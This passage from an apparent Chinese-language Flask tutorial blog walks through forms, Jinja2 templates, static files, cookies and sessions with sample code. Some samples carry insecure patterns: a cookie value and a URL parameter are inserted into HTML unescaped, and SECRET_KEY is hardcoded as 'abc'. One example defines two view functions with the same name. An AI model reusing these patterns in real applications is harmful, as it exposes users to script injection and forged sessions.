<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect, url_for, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/success/&lt;name&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">success</span><span class="params">(name)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> <span class="string">'welcome %s'</span> % name</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      user = request.form[<span class="string">'nm'</span>]</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line">   <span class="keyword">else</span>:</span><br><span class="line">      user = request.args.get(<span class="string">'nm'</span>)</span><br><span class="line">      <span class="keyword">return</span> redirect(url_for(<span class="string">'success'</span>,name = user))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   app.run(debug = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>在浏览器中以绝对路径打开login.html，输入Name</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200422231406177.png"  alt="image-20200422231406177" style="zoom:50%;">

<p>点击<code>submit</code>，表单数据将POST到表单标签的action子句中的URL：<strong><a href="http://localhost:5000/login" target="_blank" rel="noopener">http://localhost:5000/login</a></strong>映射到<strong>login()</strong>函数。由于服务器通过<strong>POST</strong>方法接收数据，因此通过以下步骤获得从表单数据获得的“nm”参数的值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user = request.form[<span class="string">'nm'</span>]</span><br></pre></td></tr></table></figure>

<p>它作为变量部分传递给<strong>‘/ success’</strong> URL。浏览器在窗口中显示<strong>welcome</strong>消息。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200422231453521.png"  alt="image-20200422231453521" style="zoom:50%;">

<p>在<strong>login.html</strong>中将方法参数更改为<strong>‘GET’</strong>，然后在浏览器中再次打开它。服务器上接收的数据是通过<strong>GET</strong>方法获得的。通过以下的步骤获得’nm’参数的值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user = request.args.get(‘nm’)</span><br></pre></td></tr></table></figure>

<p>这里，<strong>args</strong>是包含表单参数对及其对应值对的列表的字典对象。与’nm’参数对应的值将像之前一样传递到<code>/success</code>。</p>
<h2 id="Flask模板"><a href="#Flask模板" class="headerlink" title="Flask模板"></a>Flask模板</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>web模板系统：设计html，可以动态插入数据</p>
<h3 id="转义符"><a href="#转义符" class="headerlink" title="转义符"></a>转义符</h3><p><strong>Jinja2</strong>模板引擎使用以下分隔符从HTML转义。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% ... %&#125;用于语句</span><br><span class="line">&#123;&#123; ... &#125;&#125;用于表达式可以打印到模板输出</span><br><span class="line">&#123;# ... #&#125;用于未包含在模板输出中的注释</span><br><span class="line">\# ... ##用于行语句</span><br><span class="line">&#123;% endnote %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="样例1——占位符"><a href="#样例1——占位符" class="headerlink" title="样例1——占位符"></a>样例1——占位符</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/hello/&lt;user&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(user)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, name=user)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug=<span class="literal">True</span></span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>

<p>在templates文件夹中创建hello.html:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello &#123;&#123; name &#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423000839414.png"  alt="image-20200423000839414" style="zoom:50%;">

<p>URL的<strong>变量</strong>部分插入<strong></strong>占位符。<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423000811200.png"  alt="image-20200423000811200" style="zoom:50%;"></p>
<h3 id="样例2——条件语句"><a href="#样例2——条件语句" class="headerlink" title="样例2——条件语句"></a>样例2——条件语句</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/hello/&lt;int:score&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_name</span><span class="params">(score)</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>, marks = score)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line">  &#123;% if marks&gt;50 %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span> Your result is pass!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% else %&#125;</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Your result is fail<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">  &#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423001839968.png"  alt="image-20200423001839968" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423001901327.png"  alt="image-20200423001901327" style="zoom:50%;"></p>
<h3 id="样例三——表格"><a href="#样例三——表格" class="headerlink" title="样例三——表格"></a>样例三——表格</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">()</span>:</span></span><br><span class="line">   dict = &#123;<span class="string">'phy'</span>:<span class="number">50</span>,<span class="string">'che'</span>:<span class="number">60</span>,<span class="string">'maths'</span>:<span class="number">70</span>&#125;</span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'result.html'</span>, result = dict)</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"8"</span>&gt;</span></span><br><span class="line">    &#123;% for key, value in result.items() %&#125;</span><br><span class="line">   <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">th</span>&gt;</span>&#123;&#123; key &#125;&#125; <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; value &#125;&#125; <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"> <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423115824810.png"  alt="image-20200423115824810" style="zoom:50%;">

<ul>
<li>注：参考资料里的<code>&lt;tr&gt;</code>使用了转义字符，不要直接复制</li>
</ul>
<h2 id="Flask静态文件"><a href="#Flask静态文件" class="headerlink" title="Flask静态文件"></a>Flask静态文件</h2><p>特殊端点’static’用于生成静态文件的URL。</p>
<p><strong>/app.py</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">"hello.html"</span>)</span><br></pre></td></tr></table></figure>

<p>/templates/hello.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span> = <span class="string">"text/javascript"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">src</span> = <span class="string">"&#123;&#123; url_for('static', filename = 'hello.js') &#125;&#125;"</span> &gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"button"</span> <span class="attr">onclick</span> = <span class="string">"sayHello()"</span> <span class="attr">value</span> = <span class="string">"Say Hello"</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>/static/hello.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sayHello</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   alert(<span class="string">"Hello World"</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>hello.html</strong>中的HTML按钮的<strong>OnClick</strong>事件上调用<strong>hello.js</strong>中定义的<strong>javascript</strong>函数，该函数在Flask应用程序的<strong>“/”</strong>URL上呈现。</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423121323813.png"  alt="image-20200423121323813" style="zoom:50%;">

<p>点击按钮后：</p>
<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423121351647.png"  alt="image-20200423121351647" style="zoom: 50%;">



<h2 id="Flask-Request对象"><a href="#Flask-Request对象" class="headerlink" title="Flask Request对象"></a>Flask Request对象</h2><p>来自客户端网页的数据作为全局请求对象发送到服务器。为了处理请求数据，应该从Flask模块导入。</p>
<p>Request对象的重要属性如下所列：</p>
<ul>
<li><strong>Form</strong> - 它是一个字典对象，包含表单参数及其值的键和值对。</li>
<li><strong>args</strong> - 解析查询字符串的内容，它是问号（？）之后的URL的一部分。</li>
<li><strong>Cookies</strong> - 保存Cookie名称和值的字典对象。</li>
<li><strong>files</strong> - 与上传文件有关的数据。</li>
<li><strong>method</strong> - 当前请求方法。</li>
</ul>
<h2 id="Flask-将表单数据发送到模板"><a href="#Flask-将表单数据发送到模板" class="headerlink" title="Flask 将表单数据发送到模板"></a>Flask 将表单数据发送到模板</h2><p>在以下示例中，<strong>‘/‘ URL</strong>会呈现具有表单的网页（student.html）。填入的数据会发布到触发 <strong>result()</strong>函数的<strong>‘/result’ URL</strong>。</p>
<p><strong>results()</strong>函数收集字典对象中的<strong>request.form</strong>中存在的表单数据，并将其发送给<strong>result.html</strong>。</p>
<p>该模板动态呈现<strong>表单</strong>数据的HTML表格。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">student</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'student.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/result',methods = ['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">      result = request.form</span><br><span class="line">      <span class="keyword">return</span> render_template(<span class="string">"result.html"</span>,result = result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>student.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"http://localhost:5000/result"</span> <span class="attr">method</span> = <span class="string">"POST"</span> &gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Name <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Name"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Physics <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Physics"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Chemistry <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"chemistry"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span>Maths <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> =<span class="string">"text"</span> <span class="attr">name</span> = <span class="string">"Mathematics"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">"submit"</span> <span class="attr">value</span> = <span class="string">"submit"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>result.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span> = <span class="string">1</span>&gt;</span></span><br><span class="line">         &#123;% for key, value in result.items() %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">th</span>&gt;</span> &#123;&#123; key &#125;&#125; <span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">               <span class="tag">&lt;<span class="name">td</span>&gt;</span> &#123;&#123; value &#125;&#125; <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">         &#123;% endfor %&#125;</span><br><span class="line">      <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423133927822.png"  alt="image-20200423133927822" style="zoom:50%;"><img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423133942432.png"  alt="image-20200423133942432" style="zoom:50%;"></p>
<p>当点击<strong>提交</strong>按钮时，表单数据以HTML表格的形式呈现在<strong>result.html</strong>上<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423134025212.png"  alt="image-20200423134025212" style="zoom:50%;"></p>
<h2 id="Flask-Cookies"><a href="#Flask-Cookies" class="headerlink" title="Flask Cookies"></a>Flask Cookies</h2><p>Cookie以文本文件的形式存储在<strong>客户端的计算机</strong>上，其目的是记住和跟踪与客户使用相关的数据，以获得更好的访问者体验和网站统计信息。</p>
<p><strong>Request对象</strong>包含Cookie的属性。它是所有cookie变量及其对应值的字典对象，客户端已传输。除此之外，cookie还存储其网站的到期时间，路径和域名。</p>
<p>在Flask中，对响应对象设置cookie。使用<strong>make_response()</strong>函数从视图函数的返回值获取响应对象。之后，使用响应对象的<strong>set_cookie()</strong>函数来存储cookie。</p>
<p>读回cookie很容易。request.cookies属性的<strong>get()</strong>方法用于读取cookie。</p>
<h3 id="make-response"><a href="#make-response" class="headerlink" title="make_response()"></a>make_response()</h3><blockquote>
<p>该点转载自：<a href="https://www.jianshu.com/p/44d88abb9515" target="_blank" rel="noopener">https://www.jianshu.com/p/44d88abb9515</a></p>
</blockquote>
<p>make_response()，相当于DJango中的HttpResponse。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,make_response,render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.返回内容</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_response_function</span><span class="params">()</span>:</span></span><br><span class="line">    response = make_response(<span class="string">'&lt;h2&gt;羞羞哒&lt;/h2&gt;'</span>)</span><br><span class="line">    <span class="keyword">return</span> response, <span class="number">404</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.返回页面</span></span><br><span class="line"><span class="meta">@app.route('/makeresponse/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_response_function</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'hello.html'</span>)</span><br></pre></td></tr></table></figure>

<div class="note info">
            <p>注意：make_response 想要返回页面，不能直接写做：make_response(‘hello.html’)，必须用render_template(‘hello.html’)形式。</p>
          </div>



<h3 id="样例一"><a href="#样例一" class="headerlink" title="样例一"></a>样例一</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 转载自：https://blog.csdn.net/wei18791957243/article/details/85172653</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/set_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    resp = make_response(<span class="string">"success"</span>)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">        设置cookie,默认有效期是临时cookie,浏览器关闭就失效</span></span><br><span class="line"><span class="string">        可以通过 max_age 设置有效期， 单位是秒</span></span><br><span class="line"><span class="string">    '''</span><span class="string">''</span></span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_1"</span>, <span class="string">"python_1"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_2"</span>, <span class="string">"python_2"</span>)</span><br><span class="line">    resp.set_cookie(<span class="string">"Itcast_3"</span>, <span class="string">"python_3"</span>, max_age=<span class="number">3600</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/get_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        获取cookie，通过reques.cookies的方式，</span></span><br><span class="line"><span class="string">        返回的是一个字典，可以用get的方式</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    cookie_1 = request.cookies.get(<span class="string">"Itcast_1"</span>)  <span class="comment"># 获取名字为Itcast_1对应cookie的值</span></span><br><span class="line">    <span class="keyword">return</span> cookie_1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/delete_cookie")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">        删除cookie，通过delete_cookie()的方式，</span></span><br><span class="line"><span class="string">        里面是cookie的名字</span></span><br><span class="line"><span class="string">        这里的删除只是让cookie过期，并不是直接删除cookie</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    resp = make_response(<span class="string">"del success"</span>)</span><br><span class="line">    resp.delete_cookie(<span class="string">"Itcast1"</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>



<h3 id="样例二"><a href="#样例二" class="headerlink" title="样例二"></a>样例二</h3><blockquote>
<p>参考：<a href="https://blog.csdn.net/weixin_41287692/article/details/88951735" target="_blank" rel="noopener">https://blog.csdn.net/weixin_41287692/article/details/88951735</a></p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, make_response, request,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">   <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/setcookie', methods=['POST', 'GET'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setcookie</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        user = request.form[<span class="string">'nm'</span>]</span><br><span class="line">        resp = make_response(render_template(<span class="string">'readcookie.html'</span>))</span><br><span class="line">        resp.set_cookie(<span class="string">'userID'</span>, user)</span><br><span class="line">        <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/getcookie')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcookie</span><span class="params">()</span>:</span></span><br><span class="line">    name = request.cookies.get(<span class="string">'userID'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;h1&gt;welcome '</span>+name+<span class="string">'&lt;/h1&gt;'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>readcookie.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/getcookie"</span>&gt;</span>getcookie<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>index.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span> = <span class="string">"/setcookie"</span> <span class="attr">method</span> = <span class="string">"POST"</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">h3</span>&gt;</span>Enter userID<span class="tag">&lt;/<span class="name">h3</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">'text'</span> <span class="attr">name</span> = <span class="string">'nm'</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span> = <span class="string">'submit'</span> <span class="attr">value</span> = <span class="string">'Login'</span>/&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423151849332.png"  alt="image-20200423151849332" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423151859486.png"  alt="image-20200423151859486" style="zoom:50%;">

<img src="/img/loading.gif" class="lazyload" data-src="/images/Flask学习教程.assets/image-20200423151907928.png"  alt="image-20200423151907928" style="zoom:50%;">





<h2 id="Flask-会话"><a href="#Flask-会话" class="headerlink" title="Flask 会话"></a>Flask 会话</h2><p>与Cookie不同，<strong>Session（会话）</strong>数据存储在服务器上。会话是客户端登录到服务器并注销服务器的时间间隔。需要在该会话中保存的数据会存储在服务器上的临时目录中。</p>
<p>为每个客户端的会话分配<strong>会话ID</strong>。会话数据存储在cookie的顶部，服务器以<strong>加密</strong>方式对其进行签名。对于此加密，Flask应用程序需要一个定义的<strong>SECRET_KEY</strong>。</p>
<p>Session对象也是一个字典对象，包含会话变量和关联值的键值对。</p>
<blockquote>
<p>以下内容参考：<a href="https://www.jianshu.com/p/dd0aa75f3f0e" target="_blank" rel="noopener">https://www.jianshu.com/p/dd0aa75f3f0e</a></p>
</blockquote>
<h3 id="flask中如何操作session"><a href="#flask中如何操作session" class="headerlink" title="flask中如何操作session"></a>flask中如何操作session</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"><span class="comment"># 添加数据到session中</span></span><br><span class="line"><span class="comment"># 操作session的时候 跟操作字典是一样的。</span></span><br><span class="line"><span class="comment"># SECRET_KEY</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'zhangsan'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'Hello World!'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>在python中操作session的方式和操作字典的方式非常类似，<code>session[&#39;username&#39;] = &#39;zhangsan&#39;</code> 就是给session中的变量username赋值。在flask中操作session有一点需要注意，就是需要设置一个’SECRET_KEY’。可以单独在配置文件中写SECRET_KEY。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">SECRET_KEY = <span class="string">'abc'</span></span><br></pre></td></tr></table></figure>

<p>或者直接写</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = <span class="string">'abc'</span></span><br></pre></td></tr></table></figure>

